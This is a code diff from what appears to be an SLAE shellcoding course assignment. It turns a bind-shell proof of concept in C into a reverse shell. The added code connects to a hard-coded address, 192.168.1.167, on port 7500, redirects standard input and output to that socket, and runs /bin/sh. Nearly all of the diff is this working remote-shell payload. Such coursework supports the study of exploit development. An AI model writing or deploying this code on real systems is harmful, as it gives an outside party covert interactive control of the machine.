@@ -1,4 +1,4 @@
-//Description:	Assignment #1 (PoC of Shell_Bind_TCP)
+//Description:	Assignment #2 (PoC of Reverse_Shell_Bind_TCP)
 //Author: 		Paolo Stivanin <https://github.com/polslinux>
 //SLAE ID:		526
 
@@ -9,30 +9,24 @@
 #include <arpa/inet.h>
 
 int main(void){
-	int fd, newfd;
+	int fd;
 	struct sockaddr_in server_addr;
 	char *argv[] = { "/bin/sh", NULL };
 
 	server_addr.sin_family = AF_INET;
 	server_addr.sin_port = htons(7500);
-	server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
+	server_addr.sin_addr.s_addr = inet_addr("192.168.1.167");
 	
 	//socket
 	fd = socket(AF_INET, SOCK_STREAM, 0);
 	
-	//bind
-	bind(fd, (struct sockaddr *) &server_addr, 16);
-	
-	//listen
-	listen(fd, 1);
-	
-	//accept
-	newfd = accept(fd, NULL, NULL);
+	//connect
+	connect(fd, (struct sockaddr *)&server_addr, 16);
 	
 	//dup2 (0,1,2) (client will be connected to stdin, stdout and stderr)
-	dup2(newfd, 0);
-	dup2(newfd, 1);
-	dup2(newfd, 2);
+	dup2(fd, 0);
+	dup2(fd, 1);
+	dup2(fd, 2);
 	
 	//execve /bin/sh
 	execve(argv[0], &argv[0], NULL);
